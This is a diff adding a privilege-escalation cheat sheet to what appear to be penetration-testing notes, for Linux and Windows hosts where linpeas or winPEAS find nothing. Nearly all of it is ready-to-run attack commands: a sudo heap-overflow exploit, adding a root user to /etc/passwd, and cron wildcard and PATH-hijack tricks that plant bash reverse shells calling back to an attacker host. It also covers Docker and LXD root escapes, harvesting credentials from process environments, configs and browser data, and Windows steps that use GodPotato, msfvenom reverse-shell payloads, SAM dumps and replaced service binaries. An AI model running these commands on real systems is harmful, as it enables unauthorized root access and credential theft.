@@ -454,6 +454,270 @@ rm -rf ~/.offsec_tools/privesc/
 
 ---
 
+---
+
+## What linpeas / winPEAS Won't Find — Manual Privesc
+
+> [!important] The tools automate discovery but miss context-dependent vectors and configurations that require human judgment. Run these checks manually when the automated output produces no actionable findings.
+
+---
+
+### Linux — Manual Checks When linpeas Finds Nothing
+
+**Sudo rules that don't appear obvious:**
+```bash
+sudo -l                                            # what can this user run as root?
+
+# If you see (ALL) NOPASSWD: /usr/bin/find or similar GTFOBins entries:
+# https://gtfobins.github.io/ — look up the binary
+
+# If sudo requires a password you don't have — try any password you've found
+# (people reuse their login password for sudo)
+sudo su
+sudo bash
+
+# Sudo version exploit (CVE-2021-3156 Baron Samedit — sudo < 1.9.5p2)
+sudoedit -s '\' $(python3 -c "print('A'*65536)")
+```
+
+**SUID/SGID binaries:**
+```bash
+find / -perm -u=s -type f 2>/dev/null             # SUID
+find / -perm -g=s -type f 2>/dev/null             # SGID
+
+# Cross-reference against GTFOBins for each non-standard binary
+# Common engagement finds: pkexec, vim, nmap, python, bash, find, less, more, man, awk
+```
+
+**Linux capabilities (often missed by linpeas):**
+```bash
+getcap -r / 2>/dev/null
+# Dangerous caps: cap_setuid, cap_net_raw, cap_dac_override, cap_sys_admin
+
+# Example: python3 with cap_setuid
+# python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
+# Example: openssl with cap_setuid
+# openssl req -engine ./engine.so               # needs a crafted .so
+```
+
+**Writable files and directories in dangerous locations:**
+```bash
+# Writable files owned by root
+find / -writable -user root -type f 2>/dev/null | grep -v proc | grep -v sys
+
+# Writable /etc/passwd (direct root add)
+ls -la /etc/passwd
+# If writable: echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd && su pwned
+
+# Writable /etc/cron* or cron jobs that run writable scripts
+ls -la /etc/cron* /var/spool/cron/ 2>/dev/null
+cat /etc/crontab
+crontab -l
+
+# Writable script called by a root cron job
+# Find the job → find the script → write a reverse shell to it → wait
+```
+
+**Wildcard injection in cron jobs:**
+```bash
+# If a cron runs: cd /some/dir && tar czf backup.tar.gz *
+# Create files with option-like names:
+touch /some/dir/'--checkpoint=1'
+touch /some/dir/'--checkpoint-action=exec=sh shell.sh'
+echo '#!/bin/bash\nbash -i >& /dev/tcp/KALI/4444 0>&1' > /some/dir/shell.sh
+chmod +x /some/dir/shell.sh
+# Wait for cron to run — tar interprets the filenames as flags
+```
+
+**PATH hijacking:**
+```bash
+echo $PATH
+# If writable dir appears before /usr/bin in PATH:
+# Find what root scripts call without absolute paths
+strings /usr/local/bin/custom_script 2>/dev/null | grep -v '/'
+# Create a fake binary with that name in the writable dir
+echo '#!/bin/bash\nbash -i >& /dev/tcp/KALI/4444 0>&1' > /writable/dir/service
+chmod +x /writable/dir/service
+# Re-trigger the script
+```
+
+**NFS no_root_squash:**
+```bash
+# On target
+cat /etc/exports                                   # look for no_root_squash
+
+# On Kali (as root)
+showmount -e TARGET_IP
+mount -t nfs TARGET_IP:/share /mnt/nfs
+# If no_root_squash:
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+# On target:
+/mnt/nfs/bash -p                                  # drops to root shell
+```
+
+**Docker / LXC group membership:**
+```bash
+id | grep -E 'docker|lxd|lxc'
+
+# Docker group → instant root
+docker run -it -v /:/mnt alpine chroot /mnt
+# If docker is available:
+docker run -it --rm -v /:/host ubuntu chroot /host /bin/bash
+
+# LXD/LXC group → instant root
+# Build a container, mount host filesystem
+lxc init ubuntu:18.04 privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc -- chroot /mnt/root /bin/bash
+```
+
+**Internal services only listening on localhost:**
+```bash
+ss -tlnp                                           # all listeners
+ss -ulnp                                           # UDP listeners
+netstat -tlnp 2>/dev/null
+
+# If something on 127.0.0.1:PORT — forward it to yourself
+# On target:
+ssh -L 8888:127.0.0.1:PORT user@KALI              # forward to Kali
+# Or use chisel:
+./chisel client KALI:9001 R:8888:127.0.0.1:PORT
+```
+
+**Credentials in non-obvious places:**
+```bash
+# Bash history (check all users you have access to)
+cat ~/.bash_history
+find /home /root -name '.bash_history' -readable 2>/dev/null | xargs cat
+
+# Environment variables — processes sometimes have creds in env
+cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|user|key|token|secret'
+
+# Config files with hardcoded credentials
+find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.xml" \
+  2>/dev/null | xargs grep -liE 'password|passwd|secret|credential' 2>/dev/null
+
+# Web app configs (common locations)
+cat /var/www/html/config.php 2>/dev/null
+cat /var/www/html/wp-config.php 2>/dev/null
+find /var/www -name '*.php' | xargs grep -l 'pass\|mysql_connect\|PDO' 2>/dev/null | head -5
+
+# Database credentials in running processes
+ps aux | grep -iE 'mysql|postgres|mongo|redis' | grep -E '\-p|\-\-pass'
+```
+
+---
+
+### Windows — Manual Checks When winPEAS Finds Nothing
+
+**Token privileges — check for anything beyond the standard set:**
+```powershell
+whoami /priv
+
+# SeImpersonatePrivilege → GodPotato (works on all Windows versions incl. Server 2019/2022)
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add && net localgroup Administrators hacker /add"
+
+# SeBackupPrivilege → dump SAM/SYSTEM without admin
+mkdir C:\Temp\hive
+reg save HKLM\SAM C:\Temp\hive\sam.hive
+reg save HKLM\SYSTEM C:\Temp\hive\system.hive
+# Transfer to Kali → impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+# SeRestorePrivilege → overwrite any file
+# SeDebugPrivilege → dump lsass (Mimikatz)
+```
+
+**Registry — credentials and autoruns:**
+```powershell
+# Autologon (plaintext password in registry)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+# Stored credentials from cmdkey
+cmdkey /list
+
+# AlwaysInstallElevated (both keys must be 1)
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both 1: msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi > evil.msi
+# msiexec /quiet /qn /i evil.msi
+
+# Autorun keys — writable?
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+# Reboot required → only useful if you can trigger a reboot
+```
+
+**Scheduled tasks with writable scripts:**
+```powershell
+schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"
+# Find tasks running as SYSTEM or admin that call writable scripts/binaries
+icacls "C:\path\to\task\script.bat"              # check permissions
+# If writable: replace content with reverse shell, wait for trigger
+```
+
+**DLL hijacking — finding the gap:**
+```powershell
+# Services running as SYSTEM
+Get-Service | Where-Object {$_.Status -eq 'Running'} | ForEach-Object {
+  $svc = $_; $path = (Get-WmiObject Win32_Service | Where-Object {$_.Name -eq $svc.Name}).PathName
+  Write-Host "$($svc.Name): $path"
+}
+
+# Use Procmon (if available) to watch DLL loads:
+# Filter: Process Name = target.exe, Result = NAME NOT FOUND, Path ends with .dll
+# If the missing DLL's load path is writable → drop your own DLL there
+
+# Manual check: if a service loads DLLs from its own dir and that dir is writable:
+icacls "C:\Program Files\SomeApp\"               # check write perms
+# Create a DLL with the missing name, restart service
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f dll > missing.dll
+```
+
+**PowerShell history:**
+```powershell
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Look for passwords entered in commands, curl with creds, etc.
+```
+
+**Stored credentials and browser data:**
+```powershell
+# Chrome saved passwords (copy file to Kali, decrypt offline)
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Temp\
+
+# Windows Credential Manager
+rundll32.exe keymgr.dll, KRShowKeyMgr            # GUI
+# Or: use Mimikatz → vault::list
+
+# WiFi passwords (requires admin)
+netsh wlan show profiles
+netsh wlan show profile "NetworkName" key=clear  # shows PSK
+```
+
+**Service binary replacement (unquoted service path without writable parent):**
+```powershell
+# If the actual service binary is writable (winPEAS should catch this, but double-check)
+Get-WmiObject Win32_Service | Select-Object Name, PathName, StartMode, State | Format-List
+icacls "C:\path\to\service.exe"
+
+# If writable:
+move "C:\path\to\service.exe" "C:\path\to\service.exe.bak"
+copy evil.exe "C:\path\to\service.exe"
+Restart-Service -Name "ServiceName"
+```
+
+**LAPS — reading managed local admin password:**
+```powershell
+# If you have domain user access and LAPS is deployed:
+Get-ADComputer COMPUTERNAME -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
+# Or via nxc on Kali:
+nxc ldap DC_IP -u USER -p PASS -M laps
+```
+
+---
+
 ## Related
 
 - [[Linux_PrivEsc]] — manual Linux privesc techniques
